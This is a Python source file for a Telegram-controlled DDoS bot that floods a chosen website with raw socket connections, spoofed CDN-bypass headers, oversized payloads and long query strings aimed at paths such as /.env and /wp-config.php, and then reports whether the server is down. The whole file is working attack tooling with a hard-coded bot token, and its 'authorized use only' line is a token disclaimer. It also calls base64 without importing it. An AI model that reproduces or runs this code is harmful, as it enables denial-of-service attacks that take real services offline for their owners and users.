#!/usr/bin/env python3
"""
🔥 CDN BYPASS DDoS BOT - RAILWAY DEPLOY 🔥
Telegram Bot to Control CDN Bypass Attacks
"""

import os
import time
import json
import random
import socket
import threading
import requests
import concurrent.futures
import urllib3
import ssl
from urllib.parse import urlparse, urljoin
import telebot
from telebot import types

# ==================== CONFIG ====================
BOT_TOKEN = "8916689125:AAGhyAK39u2YBY6tCE13Ds41I9RE7eMxpYU"
OWNER_ID = 8935807032

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context

# ==================== BOT SETUP ====================
bot = telebot.TeleBot(BOT_TOKEN)
try:
    bot.remove_webhook()
except:
    pass

print("✅ Bot Started!")

# ==================== ATTACK ENGINE ====================
class CDNBypassAttack:
    def __init__(self):
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'server_errors': 0,
            'connection_errors': 0,
            'timeout_errors': 0,
            'bypass_attempts': 0,
            'start_time': None
        }
        self.lock = threading.Lock()
        self.active = False
        self.origin_ips = []
        self.target_url = None
        self.workers = 1000
        self.duration = 300
        self.max_requests = 1000000
        self.attack_thread = None
        
        self.bypass_endpoints = [
            '/', '/index.php', '/index.html', '/server-status', '/phpinfo.php',
            '/.git/config', '/.env', '/wp-config.php', '/config.php',
            '/api/', '/api/v1/', '/graphql', '/admin/', '/login/',
            '/debug', '/test', '/phpmyadmin/', '/mysql/', '/database/',
            '/search', '/report', '/export', '/import', '/upload',
            '/download', '/backup', '/restore', '/cache/clear',
            '/api/users', '/api/products', '/api/orders', '/api/reports',
            '/api/search', '/api/filter', '/api/export', '/api/import'
        ]

    def find_origin_server(self, domain):
        try:
            ip = socket.gethostbyname(domain)
            if ip not in self.origin_ips:
                self.origin_ips.append(ip)
            return ip
        except:
            return None

    def create_socket_flood(self, host, port=80, count=500):
        try:
            for i in range(count):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((host, port))
                    
                    request = f"GET / HTTP/1.1\r\nHost: {host}\r\n"
                    request += "User-Agent: Mozilla/5.0\r\n"
                    request += "Content-Length: 1000000\r\n"
                    request += "X-Forwarded-For: 127.0.0.1\r\n"
                    request += "\r\n" + "A" * 1000
                    
                    sock.send(request.encode())
                    sock.close()
                    
                    with self.lock:
                        self.stats['bypass_attempts'] += 1
                except:
                    with self.lock:
                        self.stats['connection_errors'] += 1
        except:
            pass

    def generate_bypass_headers(self):
        return {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'curl/7.68.0', 'Wget/1.20.3', 'Python-urllib/3.8'
            ]),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'True-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache', 'Pragma': 'no-cache',
            'Connection': 'keep-alive, close',
        }

    def generate_resource_intensive_payload(self):
        payload_types = [
            {'data': ['X' * 10000] * 100},
            {'nested': {f'level_{i}': {f'sub_{j}': 'Y' * 1000 for j in range(10)} for i in range(10)}},
            {'items': [i for i in range(100000)]},
            {'content': 'Z' * 500000},
            {'expression': '+'.join([str(i**i) for i in range(1000)])},
            {'query': 'SELECT * FROM large_table WHERE ' + ' OR '.join([f"col{i} LIKE '%test%'" for i in range(50)])},
            {'file_data': base64.b64encode(b'X' * 1000000).decode(), 'filename': 'large_file.bin'}
        ]
        return random.choice(payload_types)

    def send_bypass_request(self, base_url, request_id, use_origin_ip=False):
        try:
            parsed = urlparse(base_url)
            host = parsed.netloc
            scheme = parsed.scheme
            
            target_host = self.origin_ips[0] if use_origin_ip and self.origin_ips else host
            target_url = f"{scheme}://{target_host}"
            
            if random.random() < 0.6:
                port = 443 if scheme == 'https' else 80
                self.create_socket_flood(target_host, port, random.randint(100, 500))
                return f"SOCKET_BYPASS-{request_id}"
            
            session = requests.Session()
            session.trust_env = False
            
            headers = self.generate_bypass_headers()
            endpoint = random.choice(self.bypass_endpoints)
            full_url = urljoin(target_url, endpoint)
            
            method = random.choice(['GET', 'POST', 'PUT', 'DELETE'])
            
            if method in ['POST', 'PUT']:
                payload = self.generate_resource_intensive_payload()
                response = session.request(method, full_url, json=payload, headers=headers, timeout=5, allow_redirects=False, verify=False)
            else:
                params = {}
                for i in range(random.randint(5, 20)):
                    params[f'param{i}'] = 'A' * random.randint(1000, 5000)
                response = session.request(method, full_url, params=params, headers=headers, timeout=5, allow_redirects=False, verify=False)
            
            with self.lock:
                self.stats['total_requests'] += 1
                self.stats['successful'] += 1
                if response.status_code >= 500:
                    self.stats['server_errors'] += 1
            
            if response.status_code in [503, 500, 502, 504, 429]:
                return f"SUCCESS-{request_id} | {response.status_code} | Server Down!"
            elif response.elapsed.total_seconds() > 3:
                return f"SLOW-{request_id} | {response.status_code} | Server Stressed"
            else:
                return f"REQ-{request_id} | {response.status_code}"
            
        except requests.exceptions.Timeout:
            with self.lock:
                self.stats['timeout_errors'] += 1
                self.stats['failed'] += 1
            return f"TIMEOUT-{request_id} | Server Overwhelmed"
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.stats['connection_errors'] += 1
                self.stats['failed'] += 1
            return f"CONN_ERROR-{request_id} | Cannot Connect"
        except Exception as e:
            with self.lock:
                self.stats['failed'] += 1
            return f"ERROR-{request_id} | {str(e)[:20]}"

    def start_continuous_bypass_attack(self):
        while self.active:
            try:
                use_origin = random.random() < 0.3
                for i in range(random.randint(10, 50)):
                    if not self.active:
                        break
                    self.send_bypass_request(self.target_url, i, use_origin)
                time.sleep(0.1)
            except:
                time.sleep(0.5)

    def run_attack(self, target_url, duration=300, workers=1000, max_requests=1000000):
        self.target_url = target_url
        self.workers = workers
        self.duration = duration
        self.max_requests = max_requests
        self.active = True
        self.stats['start_time'] = time.time()
        
        parsed = urlparse(target_url)
        domain = parsed.netloc
        self.find_origin_server(domain)
        
        # Start threads
        attack_threads = []
        for i in range(20):
            t = threading.Thread(target=self.start_continuous_bypass_attack, daemon=True)
            t.start()
            attack_threads.append(t)
        
        # Main attack loop
        end_time = time.time() + duration
        request_counter = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            while time.time() < end_time and self.active and request_counter < max_requests:
                batch_size = min(workers * 3, 3000)
                futures = []
                
                for i in range(min(batch_size, max_requests - request_counter)):
                    if time.time() >= end_time or not self.active:
                        break
                    use_origin = random.random() < 0.4
                    future = executor.submit(self.send_bypass_request, target_url, request_counter, use_origin)
                    futures.append(future)
                    request_counter += 1
                
                for future in concurrent.futures.as_completed(futures):
                    try:
                        future.result(timeout=10)
                    except:
                        pass
                
                time.sleep(0.01)
        
        self.active = False
        return self.stats

    def get_stats_text(self):
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        rps = self.stats['total_requests'] / elapsed if elapsed > 0 else 0
        
        error_rate = (self.stats['server_errors'] + self.stats['connection_errors']) / max(1, self.stats['total_requests'])
        
        if error_rate > 0.7:
            status = "💀 SERVER CRASHED!"
        elif error_rate > 0.4:
            status = "🔥 SERVER HEAVILY STRESSED"
        elif error_rate > 0.2:
            status = "⚠️ SERVER SHOWING STRESS"
        else:
            status = "⚡ ATTACK IN PROGRESS"
        
        text = f"""
🔥 CDN BYPASS ATTACK STATS

🎯 Target: {self.target_url}
🔄 Status: {status}
⏱ Duration: {int(elapsed)}s

📊 REQUESTS:
• Total: {self.stats['total_requests']:,}
• Successful: {self.stats['successful']:,}
• Failed: {self.stats['failed']:,}
• RPS: {rps:,.0f}

💥 ERRORS:
• Server Errors: {self.stats['server_errors']:,}
• Connection Errors: {self.stats['connection_errors']:,}
• Timeout Errors: {self.stats['timeout_errors']:,}
• Bypass Attempts: {self.stats['bypass_attempts']:,}

⚙️ CONFIG:
• Workers: {self.workers}
• Duration: {self.duration}s
• Origin IPs: {len(self.origin_ips)}
"""
        return text

attack = CDNBypassAttack()

# ==================== BOT COMMANDS ====================

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "❌ Unauthorized.")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack"),
        types.InlineKeyboardButton("⏹ Stop Attack", callback_data="stop_attack"),
        types.InlineKeyboardButton("📊 Stats", callback_data="stats"),
        types.InlineKeyboardButton("⚙️ Config", callback_data="config")
    )
    
    text = f"""
🔥 CDN BYPASS DDoS BOT

📌 Status: {'🟢 Running' if attack.active else '🔴 Idle'}
🎯 Target: {attack.target_url or 'Not Set'}

Commands:
/start - Show menu
/attack [url] - Start attack
/stop - Stop attack
/stats - Show stats
/config - Show config

⚠️ For authorized use only.
"""
    bot.reply_to(message, text, reply_markup=markup)

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "❌ Unauthorized.")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage: /attack https://target.com")
        return
    
    target = parts[1].strip()
    if not target.startswith("http"):
        target = "https://" + target
    
    if attack.active:
        bot.reply_to(message, "⚠️ Attack already running! Use /stop first.")
        return
    
    bot.reply_to(message, f"🚀 Starting attack on {target}...")
    
    def run():
        result = attack.run_attack(target)
        bot.send_message(message.chat.id, f"✅ Attack completed!\n\n{attack.get_stats_text()}")
    
    thread = threading.Thread(target=run, daemon=True)
    thread.start()

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "❌ Unauthorized.")
        return
    
    if not attack.active:
        bot.reply_to(message, "⚠️ No attack running.")
        return
    
    attack.active = False
    bot.reply_to(message, "⏹ Attack stopped!\n\n" + attack.get_stats_text())

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "❌ Unauthorized.")
        return
    
    if not attack.stats['start_time']:
        bot.reply_to(message, "📊 No attack data yet.")
        return
    
    bot.reply_to(message, attack.get_stats_text())

# ==================== CALLBACKS ====================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    if user_id != OWNER_ID:
        bot.answer_callback_query(call.id, "❌ Unauthorized!", True)
        return
    
    if call.data == "start_attack":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "📌 Send target URL:\n/attack https://target.com")
    
    elif call.data == "stop_attack":
        bot.answer_callback_query(call.id)
        if attack.active:
            attack.active = False
            bot.send_message(call.message.chat.id, "⏹ Attack stopped!\n\n" + attack.get_stats_text())
        else:
            bot.send_message(call.message.chat.id, "⚠️ No attack running.")
    
    elif call.data == "stats":
        bot.answer_callback_query(call.id)
        if attack.stats['start_time']:
            bot.send_message(call.message.chat.id, attack.get_stats_text())
        else:
            bot.send_message(call.message.chat.id, "📊 No attack data yet.")
    
    elif call.data == "config":
        bot.answer_callback_query(call.id)
        text = f"""
⚙️ CONFIGURATION

• Workers: {attack.workers}
• Duration: {attack.duration}s
• Max Requests: {attack.max_requests:,}
• Origin IPs: {len(attack.origin_ips)}
• Active: {'✅' if attack.active else '❌'}

To change: Modify script variables.
"""
        bot.send_message(call.message.chat.id, text)

# ==================== MAIN ====================
def main():
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║   🔥 CDN BYPASS DDoS BOT - RAILWAY DEPLOY                  ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    print(f"✅ Owner: {OWNER_ID}")
    print(f"✅ Bot starting...")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
